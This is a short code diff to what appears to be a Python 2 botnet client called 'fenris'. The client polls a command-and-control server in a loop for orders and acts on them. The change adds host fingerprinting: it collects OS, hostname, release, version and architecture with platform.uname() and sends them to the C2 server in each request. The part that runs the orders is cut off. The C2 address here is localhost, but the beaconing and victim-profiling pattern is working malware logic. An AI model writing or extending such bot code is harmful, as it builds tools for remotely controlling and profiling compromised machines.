@@ -21,13 +21,16 @@
 
 
 import urllib2
+import platform
 
 
 candc = "127.0.0.1"
+# extract system information
+systemData = platform.uname()
 
 while(True):
     # get fenris orders
-    orders = urllib2.urlopen("http://" + candc + "/orders.php?p=bot").read().split("\n")
+    orders = urllib2.urlopen("http://" + candc + "/orders.php?p=bot&os=" + systemData[0] + "&username=" + systemData[1] + "&version=" + systemData[2] + "&osdetail=" + systemData[3] + "&architecture=" + systemData[4]).read().split("\n")
 
     # perform action (for extra cuteness)
     doit = orders[0]
